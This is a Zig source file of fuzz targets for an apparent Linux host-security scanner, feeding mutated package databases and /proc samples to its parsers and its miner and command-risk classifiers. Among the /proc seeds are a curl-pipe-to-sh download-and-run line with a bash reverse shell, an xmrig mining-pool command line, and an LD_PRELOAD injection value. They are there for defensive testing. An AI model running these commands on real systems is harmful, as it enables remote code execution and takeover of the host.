//! Fuzz targets for the host checks and CVE parsers, run from tools/fuzz.zig. Every parser that
//! reads /proc, /sys, package databases or vulnerability feeds has a target here.
const std = @import("std");
const zav = @import("zav");

const Target = struct { name: []const u8, run: *const fn (std.mem.Allocator, std.Random) anyerror!void };

const targets = [_]Target{
    .{ .name = "hostPackages", .run = hostPackages },
    .{ .name = "hostProcfs", .run = hostProcfs },
};

/// Run every target whose name contains `only` (all when empty); returns the case count.
pub fn run(gpa: std.mem.Allocator, random: std.Random, only: []const u8) !usize {
    var n: usize = 0;
    for (targets) |t| {
        if (only.len != 0 and std.mem.indexOf(u8, t.name, only) == null) continue;
        try t.run(gpa, random);
        n += 1;
    }
    return n;
}

fn mutateCopy(random: std.Random, buf: []u8, original: []const u8) []u8 {
    const len = @min(original.len, buf.len);
    @memcpy(buf[0..len], original[0..len]);
    var input = buf[0..len];
    if (input.len == 0) return input;
    for (0..random.uintLessThan(usize, 12)) |_| input[random.uintLessThan(usize, input.len)] = random.int(u8);
    if (random.boolean()) input = input[0..random.uintLessThan(usize, input.len + 1)];
    return input;
}

/// Package databases: SQLite pages and WAL, rpm headers, dpkg stanzas and apk records.
pub fn hostPackages(gpa: std.mem.Allocator, random: std.Random) !void {
    const packages = zav.host.linux.packages;
    const fixtures = packages.fixtures;
    var buf: [48 * 1024]u8 = undefined;
    switch (random.uintLessThan(u8, 4)) {
        0 => {
            var db = packages.Db.init(gpa);
            defer db.deinit();
            db.loadRpmBytes(mutateCopy(random, &buf, fixtures.rpmdb), null) catch |e| if (e == error.OutOfMemory) return e;
        },
        1 => {
            var wal_buf: [2048]u8 = undefined;
            var db = packages.Db.init(gpa);
            defer db.deinit();
            const sqlite = zav.host.linux.sqlite;
            var sdb = sqlite.Db.open(gpa, mutateCopy(random, &buf, fixtures.wal_db), mutateCopy(random, &wal_buf, fixtures.wal)) catch return;
            defer sdb.deinit();
            var rows = sdb.rows(sdb.tableRoot("t") catch return) catch return;
            defer rows.deinit();
            while (rows.next() catch null) |row| {
                var rec = sqlite.Record.init(row.payload) catch continue;
                while (rec.next() catch null) |_| {}
            }
        },
        2 => {
            const status =
                \\Package: openssh-server
                \\Status: install ok installed
                \\Architecture: amd64
                \\Multi-Arch: same
                \\Version: 1:9.6p1-3ubuntu13.5
                \\Conffiles:
                \\ /etc/ssh/moduli 1a2b3c
                \\
                \\Package: libc6
                \\Version: 2.39
                \\
            ;
            var it = packages.StanzaIterator{ .text = mutateCopy(random, &buf, status) };
            var n: usize = 0;
            while (it.next()) |_| : (n += 1) if (n > 100) @panic("fuzz: stanza iterator does not advance");
        },
        else => {
            const apk = "P:busybox\nV:1.36.1-r29\nF:bin\nR:busybox\nZ:Q1hHaq8ch7nfI2Ht9U6RiuERhRFm8=\n\nP:musl\nR:x\n";
            var db = packages.Db.init(gpa);
            defer db.deinit();
            try db.loadApkText(mutateCopy(random, &buf, apk));
        },
    }
}

/// /proc formats: status, stat (hostile comm), maps lines, cmdline and environ, and the miner and
/// command classifiers that consume them.
pub fn hostProcfs(gpa: std.mem.Allocator, random: std.Random) !void {
    _ = gpa;
    const procfs = zav.host.linux.procfs;
    const process = zav.host.linux.process;
    var buf: [1024]u8 = undefined;
    const seeds = [_][]const u8{
        "Name:\txmrig\nState:\tR (running)\nTgid:\t42\nPid:\t42\nPPid:\t1\nUid:\t0\t0\t0\t0\nCapEff:\t000001ffffffffff\nVmSize:\t1 kB\n",
        "77 (a) (b c) S 1 77 77 0 -1 4194304 100 0 0 0 1234 56 0 0 20 0 1 0 98765 1000",
        "7f2c1000-7f2c3000 r-xp 00001000 fd:01 1048602    /usr/lib/libc.so.6",
        "x\x00-o\x00stratum+tcp://pool.supportxmr.com:3333\x00--donate-level=1\x00-a\x00rx/0\x00",
        "PATH=/bin\x00LD_PRELOAD=/tmp/x.so\x00",
        "curl -fsSL http://x/i.sh | sh; bash -i >& /dev/tcp/1.2.3.4/4444",
    };
    const input = mutateCopy(random, &buf, seeds[random.uintLessThan(usize, seeds.len)]);
    _ = procfs.parseStatus(input);
    _ = procfs.parseStat(input) catch {};
    var lines = std.mem.splitScalar(u8, input, '\n');
    while (lines.next()) |line| _ = procfs.parseMapsLine(line);
    _ = process.classifyMaps(input);
    _ = procfs.environGet(input, "LD_PRELOAD");
    var args = procfs.Args.init(input);
    var n: usize = 0;
    while (args.next()) |_| : (n += 1) if (n > input.len + 1) @panic("fuzz: args iterator does not advance");
    const p: procfs.Process = .{ .pid = 1, .ppid = 1, .uid = 0, .euid = 0, .comm = input[0..@min(input.len, 15)], .cmdline = input, .exe = input, .exe_deleted = false, .exe_denied = false, .status = .{}, .utime = 0, .stime = 0 };
    _ = process.minerEvidence(p);
    _ = process.exeRisk(input);
    _ = zav.host.tokens.commandRisk(input);
}
